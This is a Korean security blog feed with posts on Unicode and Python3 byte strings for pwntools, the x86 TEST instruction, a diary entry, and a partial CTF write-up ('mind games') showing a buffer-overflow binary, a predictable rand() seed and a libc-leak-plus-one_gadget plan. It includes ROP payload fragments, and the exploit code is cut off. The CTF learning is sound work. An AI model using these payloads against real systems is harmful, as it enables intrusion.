영역이란 것이 존재한다. 상위 대행코드와 하위 대행코드를 조합해서 <code>보충 언어판</code>의 문자를 표현한다. 즉, 2byte가 꼭 한 개의 문자를 의미하는 것은 아니다. 한개를 읽어보고 대행코드이면 그 다음 한개를 더 읽어 한 문자를 완성한다. </p><p><code>기본 언어판</code>의 대행코드 영역은 아래와 같다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">상위 대행코드 (High Surrogates) : D800 - DBFF</span><br><span class="line">하위 대행코드 (Low Surrogates) : DC00 - DFFF</span><br></pre></td></tr></table></figure><p>정리하자면 <code>유니코드는 2byte로만 표현할 수 있다.</code>는 완전히 틀린 소리이다. 결국 <code>유니코드</code>는 모든 문자에 index(Unidocde code point, 고유한 값)를 부여한 것이다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;A&#x27;라는 글자는 0x0041(U+0041)이라는 index를 가진다.</span><br><span class="line">&#x27;a&#x27;라는 글자는 0x0061(U+0061)이라는 index를 가진다.</span><br><span class="line">&#x27;가&#x27;라는 글자는 0xAC00(U+AC00)이라는 index를 가진다.</span><br></pre></td></tr></table></figure><p>참고로 <code>U+</code>라는 접두어가 붙어있으면 <code>유니코드</code>라는 의미이다. <code>U+0000 ~ U+007F</code>로 <code>ASCII</code> 문자를 모두 표현할 수 있다. 참고로 <code>U+AC00 ~ U+D7AF</code>로 한글 음절을 표현할 수 있다.</p><h2 id="유니코드를-표현하는-방법"><a href="#유니코드를-표현하는-방법" class="headerlink" title="유니코드를 표현하는 방법"></a>유니코드를 표현하는 방법</h2><p><code>유니코드</code>의 index를 표현하는 방법에 대해 알아보자. 이러한 index는 여러 형식으로 변환될 수 있는데, 그 중 개인적으로 가장 익숙한 <code>UTF-8</code> 인코딩을 알아봤다. </p><p>그 전에 궁금증이 있다. index를 바로 컴퓨터에 저장하면 안되는 걸까? 왜 컴퓨터에 저장하기 위해서 또 변환을 해야할까? 용량때문이다. 예를 들어, 1byte로 충분히 표현할 수 있는 A를 굳이 2byte로 저장한다면 용량 문제가 생길 것이다. 호환이 잘되고 용량을 적게 만들기 위해 유니코드의 index(숫자)를 컴퓨터에 효과적으로 할당해서 0과 1로 표현할 지 결정하는 <code>인코딩 방식</code>이 필요하다. </p><h3 id="UTF-8-가변길이-인코딩-Unicode-Transformation-Format"><a href="#UTF-8-가변길이-인코딩-Unicode-Transformation-Format" class="headerlink" title="UTF-8 (가변길이 인코딩, Unicode Transformation Format)"></a>UTF-8 (가변길이 인코딩, Unicode Transformation Format)</h3><p><code>유니코드</code>가 인터페이스라면 <code>UTF-8</code>은 구현체라고 할 수 있다. <code>UTF-8</code>은 8bit 문자 인코딩 형식으로 <code>유니코드</code> 문자를 index에 따라 8bit(&#x3D;1byte) ~ 4byte로 변환한다. </p><p><code>UTF-8</code>은 가변바이트를 사용하기 때문에, 1byte로 표현이 충분한 A는 0x41로 표현한다. 이는 <code>UTF-8</code>과 <code>ASCII 코드</code>와 영문 영역에서는 100% 호환된다는 것을 의미한다. </p><h4 id="Code-point-↔-UTF-8-conversion"><a href="#Code-point-↔-UTF-8-conversion" class="headerlink" title="Code point ↔ UTF-8 conversion"></a>Code point ↔ UTF-8 conversion</h4><table><thead><tr><th align="right">First code point</th><th align="right">Last code point</th><th>Byte 1</th><th>Byte 2</th><th>Byte 3</th><th>Byte 4</th></tr></thead><tbody><tr><td align="right">U+0000</td><td align="right">U+007F</td><td>0xxxxxxx</td><td></td><td></td><td></td></tr><tr><td align="right">U+0080</td><td align="right">U+07FF</td><td>110xxxxx</td><td>10xxxxxx</td><td></td><td></td></tr><tr><td align="right">U+0800</td><td align="right">U+FFFF</td><td>1110xxxx</td><td>10xxxxxx</td><td>10xxxxxx</td><td></td></tr><tr><td align="right">U+10000</td><td align="right">U+10FFFF</td><td>11110xxx</td><td>10xxxxxx</td><td>10xxxxxx</td><td>10xxxxxx</td></tr></tbody></table><p>출처: <a href="https://en.wikipedia.org/wiki/UTF-8">https://en.wikipedia.org/wiki/UTF-8</a></p><p>위와 같이 <code>유니코드</code> 범위에 따라 <code>UTF-8</code> 인코딩의 byte 개수가 정해진다. 참고로 한글은 3byte로 표현된다.</p><h2 id="Python에서서의-문자열-인코딩"><a href="#Python에서서의-문자열-인코딩" class="headerlink" title="Python에서서의 문자열 인코딩"></a>Python에서서의 문자열 인코딩</h2><p>컴퓨터가 저장할 수 유일한 것은 byte이다. 그래서 인코딩 즉, byte로 변환해야하는 과정을 거쳐야 한다. Python에서의 문자열 인코딩 방식을 알아보자.</p><h3 id="Python2"><a href="#Python2" class="headerlink" title="Python2"></a>Python2</h3><p>Python2에서는 <code>ASCII</code>가 디폴트 인코딩 방법으로 되어있다. <code>ASCII</code>로는 한글을 표현할 수 없으므로, 한글을 표현하기 위해서 아래의 코드를 코드 맨 윗줄에 따로 명시해야한다.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br></pre></td></tr></table></figure><h3 id="Python3"><a href="#Python3" class="headerlink" title="Python3"></a>Python3</h3><p>Python3에서는 <code>UTF-8</code>이 디폴트 인코딩 방법이다. 그래서 모든 문자열은 <code>유니코드</code>로 처리된다. <code>b&#39;&#39;</code>는 byte임을 의미한다. 디폴트로 <code>UTF-8</code>로 인코딩되어 byte 문자열로 표현했으므로 이것을 다시<code>.decode()</code>하면 <code>UTF-8</code>로 디코딩하여 문자열로 표현할 수 있다. </p><p>정리하면 인코딩 방식만 알면 byte 문자열을 다시 문자열로 디코딩할 수 있다는 의미다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; b&#x27;jir4vvit&#x27;</span><br><span class="line">b&#x27;jir4vvit&#x27;</span><br><span class="line">&gt;&gt;&gt; type(_)</span><br><span class="line">&lt;class &#x27;bytes&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; </span><br><span class="line">&gt;&gt;&gt; b&#x27;jir4vvit&#x27;.decode()</span><br><span class="line">&#x27;jir4vvit&#x27;</span><br><span class="line">&gt;&gt;&gt; type(_)</span><br><span class="line">&lt;class &#x27;str&#x27;&gt;</span><br></pre></td></tr></table></figure><p>요즘 Pwnable을 풀 때 Python3으로 작성하고 있다. 이것을 헷갈리고 가장 처음에 했던 실수는 아래와 같다. 지금 생각해보면 왜 이렇게 했었는지 이해가 안간다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; str(b&#x27;jir4vvit&#x27;)</span><br><span class="line">&quot;b&#x27;jir4vvit&#x27;&quot;</span><br><span class="line">&gt;&gt;&gt; type(_)</span><br><span class="line">&lt;class &#x27;str&#x27;&gt;</span><br></pre></td></tr></table></figure><p>문자열에 대한 이해를 제대로 하지 않고 저지른 실수이다. Python3니까 어디서 많이 본 <code>b&#39;&#39;</code>으로 문자열을 감싸고 이걸 <code>str()</code>로 감싸서 <code>p.send()</code>했었다. </p><p><strong>여러 시도 끝에 마음편하게 byte 문자열로 payload를 구성하기로 했다.</strong></p><p>아래처럼 문자열로 payload를 구성하면 될 때도 있고 안될 때도 있다. 되는 건 운이 좋은 때고, 안될 때는 에러가 발생한다. (안되는 경우가 더 많을 것 같다.)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = &#x27;&#x27;</span><br><span class="line">payload += &#x27;A&#x27; * 0x50</span><br><span class="line">payload += &#x27;\x00\x00\x00\x00\x00\x00\x00\x00&#x27; # rbp</span><br><span class="line">payload += &#x27;\x83\x0c\x40\x00\x00\x00\x00\x00&#x27; # pop rdi</span><br><span class="line">payload += p64(e.got[&#x27;puts&#x27;]).decode()</span><br><span class="line">payload += &#x27;\xe0\x06\x40\x00\x00\x00\x00\x00&#x27; # puts plt</span><br><span class="line">payload += p64(main).decode()</span><br></pre></td></tr></table></figure><p>실제로 아래와 같은 디코드가 안된다는 에러를 받았었다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;/home/jir4vvit/ex.py&quot;, line 99, in &lt;module&gt;</span><br><span class="line">    payload += p64(binsh).decode()</span><br><span class="line">UnicodeDecodeError: &#x27;utf-8&#x27; codec can&#x27;t decode byte 0xcf in position 1: invalid continuation byte</span><br></pre></td></tr></table></figure><p>마음편히 byte로 보내면 저런 디코딩 에러를 만날 일이 없다. pwntools는 기본적으로 byte로 처리하기 때문에 payload를 아래처럼 byte로 작성해주면 정말정말 디코딩 에러를 만날 일이 없다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = &#x27;&#x27;</span><br><span class="line">payload += b&#x27;A&#x27; * 0x50</span><br><span class="line">payload += p64(0) # rbp</span><br><span class="line">payload += p64(pop_rdi) </span><br><span class="line">payload += p64(e.got[&#x27;puts&#x27;])</span><br><span class="line">payload += p64(e.symbols[&#x27;puts])</span><br><span class="line">payload += p64(main)</span><br></pre></td></tr></table></figure><p>또한 Python2와 다르게 byte 문자열과 문자열을 혼합해서 작성할 수 없다. 일관되게 작성해야 한다. </p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://whatisthenext.tistory.com/103">https://whatisthenext.tistory.com/103</a></li><li><a href="https://velog.io/@zionhann/%ED%8C%8C%EC%9D%B4%EC%8D%AC-%EC%9C%A0%EB%8B%88%EC%BD%94%EB%93%9C-%EB%AC%B8%EC%9E%90-%EB%B3%80%ED%99%98%ED%95%98%EA%B8%B0">https://velog.io/@zionhann/%ED%8C%8C%EC%9D%B4%EC%8D%AC-%EC%9C%A0%EB%8B%88%EC%BD%94%EB%93%9C-%EB%AC%B8%EC%9E%90-%EB%B3%80%ED%99%98%ED%95%98%EA%B8%B0</a></li><li><a href="https://finebe.tistory.com/42">https://finebe.tistory.com/42</a></li><li><a href="https://velog.io/@goggling/%EC%9C%A0%EB%8B%88%EC%BD%94%EB%93%9C%EC%99%80-UTF-%EC%9D%B4%ED%95%B4%ED%95%98%EA%B8%B0">https://velog.io/@goggling/%EC%9C%A0%EB%8B%88%EC%BD%94%EB%93%9C%EC%99%80-UTF-%EC%9D%B4%ED%95%B4%ED%95%98%EA%B8%B0</a></li></ul><p>이 글을 작성할 당시엔 댓글기능이 없다. 틀린 말이나 첨언이 있다면 메일 한 통 부탁드립니다. 메일 주소는 <a href="https://jiravvit.github.io/">블로그 메인 화면</a> 에서 찾을 수 있습니다.</p>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python3 </tag>
            
            <tag> string </tag>
            
            <tag> Unicode </tag>
            
            <tag> ASCII </tag>
            
            <tag> byte </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>What does the &#39;TEST&#39; instruction do</title>
      <link href="/221013-test-instruction/"/>
      <url>/221013-test-instruction/</url>
      
        <content type="html"><![CDATA[<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><p>어셈블리어에서 <code>TEST</code> 명령어는 <code>eax</code>의 값이 0이냐 아니냐를 판단하기 위해서 사용한다. 만약 <code>eax</code>의 값이 0이라면 (<code>zf</code>가 세팅되어) 뒤에 <code>JE</code>나 <code>JZ</code> 명령어가 온다면 jump한다.</p><h2 id="TEST-명령어"><a href="#TEST-명령어" class="headerlink" title="TEST 명령어"></a>TEST 명령어</h2><p>문제를 풀다가 언제 jump하는지 항상 헷갈려서 블로그에 정리하려고 한다..</p><p>아래는 예시 어셈블리어이다.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:0000131E</span><br><span class="line">.text:0000131E loc_131E:</span><br><span class="line">.text:0000131E lea     eax, (var - 4000h)[ebx]</span><br><span class="line">.text:00001324 mov     edx, [eax+38h]</span><br><span class="line">.text:00001327 mov     eax, [eax+34h]</span><br><span class="line">.text:0000132A xor     eax, 11h</span><br><span class="line">.text:0000132D or      eax, edx</span><br><span class="line">.text:0000132F test    eax, eax</span><br><span class="line">.text:00001331 jnz     short loc_1347</span><br></pre></td></tr></table></figure><p>간단하다.</p><p><code>test    eax, eax</code> 에서 <code>eax</code>가 0인지 판단하고, 만약 0이라면 <code>zf</code>가 1로 세팅된다. <code>jnz(=jump not zero)</code> 명령어는 이름 그대로 0이 아닐 경우 jump하기 때문에 <code>eax</code>가 0이라면 jump하지 않는다. </p><p>하지만 문제 풀 때 의외로 많이 헷갈렸으므로 이 로직을 조금 더 뜯어보자.</p><h3 id="1"><a href="#1" class="headerlink" title="1."></a>1.</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">text:00001324 mov     edx, [eax+38h]</span><br><span class="line">.text:00001327 mov     eax, [eax+34h]</span><br></pre></td></tr></table></figure><ul><li>이 연산은 <code>edx</code>와 <code>eax</code> 주소에 값을 저장하는 연산이다.</li><li>사용자 인풋은 <code>eax</code> 주소에 저장된다. bss영역 정의된 배열에 값을 쓰는데 어째선지 배열의 사이즈를 모르는 상황이다.</li><li><code>edx</code>에 배열 밖의 값이 저장된다는 사실을 파악해보자.</li></ul><h3 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0000132A xor     eax, 11h</span><br></pre></td></tr></table></figure><ul><li><code>xor</code> 연산을 진행한다. <code>eax</code>가 0x11라면 0으로 초기화가 되겠고, 0이라면 <code>eax</code>에 0x11가 저장될 것 이다.</li><li>앞 부분 분석을 해보면 <code>eax</code>에 무조건 0x11을 넣고 싶어질 것이기 때문에 이 연산 값은 0이 되고 <code>eax</code>에 0이 담긴다.</li></ul><h3 id="3"><a href="#3" class="headerlink" title="3."></a>3.</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0000132D or      eax, edx</span><br></pre></td></tr></table></figure><ul><li><code>or</code> 연산을 진행한다. 두 값 중 어느 하나라도 0이 아니면 0이 아닌 수가 <code>eax</code>에 담길 것이다. </li><li>현재 <code>eax</code>은 0으로 고정이므로 <code>edx</code> 값에 집중하여 분석해보자.</li><li><code>edx</code>가 0이라면? <code>0 | 0 = 0</code>, <code>eax</code>의 값은 0이 된다.</li><li><code>edx</code>가 X라면? <code>0 | X = X</code>, <code>eax</code>의 값은 X이 된다.</li></ul><h3 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:0000132F test    eax, eax</span><br></pre></td></tr></table></figure><ul><li><code>eax</code>가 0인지를 검사한다. 실제로 <code>eax</code>에 값을 쓰지는 않는다.</li><li><code>eax</code>가 0인 경우: <code>edx</code>의 값이 0인 경우 </li><li><code>eax</code>가 X인 경우: <code>edx</code>의 값이 X인 경우</li></ul><h3 id="5"><a href="#5" class="headerlink" title="5."></a>5.</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00001331 jnz     short loc_1347</span><br></pre></td></tr></table></figure><ul><li><code>jnz = jump not zero</code></li><li><code>eax</code>가 0이 아니면 jump한다.</li><li>참고로 <code>loc_1347</code>은 실행하고 싶은 로직이 아니다.</li><li>결론적으로 jump를 하면 안되고, <code>eax</code>가 0이어야 한다. <code>eax</code>가 0이려면 <code>edx</code>가 0이어야 한다.</li><li>overflow때문에 <code>edx</code>에 값을 입력할 수 있지만 배열 크기 검사를 진행했기 때문에 값을 쓰면 안된다는 결론을 얻을 수 있다.</li></ul>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rev </tag>
            
            <tag> assembly </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022-10-11 Diary</title>
      <link href="/221011-diary/"/>
      <url>/221011-diary/</url>
      
        <content type="html"><![CDATA[<h2 id="블로그-이전"><a href="#블로그-이전" class="headerlink" title="블로그 이전"></a>블로그 이전</h2><p>9월 중순? 말? 쯤에 블로그 플랫폼을 옮겼었다. 원래는 <a href="https://jiravvit.tistory.com/">티스토리 블로그</a>를 이어서 쓰려고 했었다. 하지만 개인적으로 티스토리 블로그의 코드블럭이 굉장히 마음에 안들었고 그냥 뭔가 새로운 기분을 내고 싶어서 블로그 플랫폼을 옮기고 싶다는 생각이 들었다. 그러던 중에 지금 작성 중인 github 블로그를 추천받았다. </p><p>그래서 github 블로그를 개설하고 글도 몇개 적어놨었는데, 운영체제를 바꾸다가 블로그를 날려먹었다.</p><p>나는 Hexo를 이용하고 있다. Hexo는 <code>hexo generate</code> 명령으로 public 폴더 안에 정적 파일을 생성하고, <code>hexo deploy</code>로 그 정적 파일들을 git에 올리기 위해 <code>.deploy_git</code> 폴더에 복사하고 이 곳에 있는 것만 깃허브 블로그에 올라가는 구조이다.</p><p>그래서 만약 다른 컴퓨터에서 블로그 글을 작성하고 싶다면 hexo 블로그를 생성해주는 파일 전체를 담는 폴더도 관리를 해야한다. ㅋㅋ..</p><p>아무튼 날려먹어서 절망에 빠져있었는데 다행히 글을 작성했던 md파일은 가지고 있었어서 내용 자체를 전부 날려먹지는 않았다. 사실 블로그 테마도 조금 마음에 안들었어서 바꾸고 싶은 욕심이 있었는데 잘됐지 뭐… T.T</p><p>전에 쓰던 블로그 테마는 light 모드는 예쁜데 dark 모드는 별로 예쁘지가 않았다. 어두운 곳에서 컴퓨터를 하는 비율이 많아져서 dark 모드를 조건으로 테마를 이리저리 둘러봤는데, 지금 쓰고 있는 이 테마가 dark 모드에서 가장 이쁘다고 생각했다. </p><p>나중에 sitemap도 다시 등록하고 댓글 기능도 차차 추가해야겠다.. </p><h2 id="POXX-2022-예선"><a href="#POXX-2022-예선" class="headerlink" title="POXX 2022 예선"></a>POXX 2022 예선</h2><p>얼마 전에 여성 해킹 대회 POXX 예선이 있었다. Demon팀으로서 pwn 2문제, rev 1문제를 출제했다. 문제에 대한 이야기를 풀어보고 싶은데 본선 끝나고 풀고자 한다. pwn 2문제는 각각 3, 2 solve를 달성했다. 목표했던 solve 수와 비슷해서 다행이었다.</p><h2 id="자잘한-이야기"><a href="#자잘한-이야기" class="headerlink" title="자잘한 이야기"></a>자잘한 이야기</h2><ol><li><p>요즘 도커와 친해지려고 노력 중이다. 예전에 여러번 시도했었는데 사용법이 적응이 안되어서 실패하고 가상머신을 설치했었다..ㅋㅋ 그런데 이번엔 조금 많이 친해졌다. 뿌듯하다.</p></li><li><p>전에 다니던 대학에서 보안 관련에서 발표를 해주면 좋겠다고 연락이 왔었다. 무려 총장님의 부름이었는데 개인사유로 인해 거절했다. 잘 오지 않는 기회였는데 아쉽다.</p></li><li><p>운영체제를 바꿨다. windows 11에서 arch linux로.. ㅋㅋ<br>windows가 가장 불편했던 것은 가상머신을 구동하다보면 가상머신 자체가 매우매우매우 느려진다. 그리고 뭔가 창 관리가 안됐다. 사실 wsl도 추천받고 써봤었는데 뭔가 내 스타일은 아니었다(?) 그러던 중에 arch linux로 운영체제를 바꾸는 건 어떻냐고 권유받았고 바로 실행하였다. ㅎ<br>windows에서 가상머신으로 ubuntu를 쓰는 것과 가장 큰 차이는 arch는 정말 깔려있는 게 없다는 것이다. 사용자가 전부 다 설정해줘야 한다. 자유도가 높고 가볍다는 것이 어떤건지 바로 실감할 수 있었다. 그리고 ubuntu를 설치할 땐 next 버튼 하나로 모든 것이 진행되었는데, 이건 내가 직접 명령어를 쳐줘야 한다. 좀 신기했다.<br>i3 처음 쓸 때 정말 안익숙했었는데 지금은 많이 익숙해졌다. 오히려 i3을 쓰지 않으면 불편하다. arch도 그렇게 될 것이라 믿는다.</p></li><li><p>분석하고 싶은 것이 있었어서 분석을 잠깐 했었는데 역시나 분석은 어렵다. 관련 내용을 나중에 블로그에 적고 싶다.</p></li><li><p>나중에 영어로도 글을 써보고 싶다. 언젠간 꼭..</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GDG Algiers CTF 2022 - mind games (random)</title>
      <link href="/221011-gdg_algires_ctf_2022-mind_games/"/>
      <url>/221011-gdg_algires_ctf_2022-mind_games/</url>
      
        <content type="html"><![CDATA[<p>분석 환경: Arch linux<br>사용자 제공 파일: binary, source code, libc </p><p>Help! This program is playing mind games with me! You need to put an end to this madness.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="보호-기법"><a href="#보호-기법" class="headerlink" title="보호 기법"></a>보호 기법</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3ff000)</span><br></pre></td></tr></table></figure><h3 id="취약점"><a href="#취약점" class="headerlink" title="취약점"></a>취약점</h3><p>제공된 source code가 짧아서 전문을 올렸다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUF_SIZE 32</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flag</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">disable_buffering</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">flag</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    FILE* file;</span><br><span class="line">    <span class="type">int</span> c = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    file = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == file) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Cannot open flag.txt&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">            c = fgetc(file);</span><br><span class="line">            <span class="keyword">if</span> (c == EOF)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="built_in">putchar</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">        fclose(file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> input[BUF_SIZE] = &#123; <span class="string">&#x27;\0&#x27;</span> &#125;;</span><br><span class="line">    <span class="type">int</span> randnum, guess;</span><br><span class="line"></span><br><span class="line">    disable_buffering();</span><br><span class="line"></span><br><span class="line">    srand(time(<span class="literal">NULL</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You think you can read my mind? &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, input); <span class="comment">// bof</span></span><br><span class="line">    guess = atoi(input);</span><br><span class="line">    randnum = rand();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (guess == randnum) &#123;</span><br><span class="line">        flag();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;That&#x27;s what I thought.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">disable_buffering</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>random 값을 맞추면 <code>flag()</code> 함수를 호출한다. <code>scanf(&quot;%s&quot;, input)</code>에서 bof가 터지니깐 input을 입력할 때 guess랑 randnum을 동일하게 주면 우회가 되지 않을까? 생각했다. 하지만 입력 후에 guess와 randnum을 정의하기 때문에 그런 방법은 통하지 않는다.</p><p>어떻게 해야할까?</p><p>randnum을 정의하는 함수는 <code>rand()</code> 함수이다. 간단하게 말하면 이 함수는 <code>srand()</code> 함수에 의존적인데 인자로 <code>time(NULL)</code>이 들어간다. 같은 시간대에 다른 프로그램을 실행해도 프로그램의 현재 시간을 가져오기 때문에 우리는 randnum을 예측할 수 있다.</p><p>관련 내용은 나의 <a href="https://jiravvit.tistory.com/entry/NOTE-coding-%EB%82%9C%EC%88%98%EC%83%9D%EC%84%B1randsrandtime-C%EC%96%B8%EC%96%B4">구 티스토리 블로그</a>에 자세히 설명되어 있다.</p><p>이런식으로 <code>flag()</code> 함수를 호출할 수 있는데 미리 스포하자면 이 함수는 진짜 flag를 호출하지 않는다.</p><p>그래서 bof를 이용하여 rip를 바꿔 <code>execve</code>를 호춣해야 한다.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="시나리오"><a href="#시나리오" class="headerlink" title="시나리오"></a>시나리오</h3><ol><li>random 값 구한 후, libc leak 후 main으로 흐름 돌리기</li><li>random 값 다시 구한 후, one gadget 호출</li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 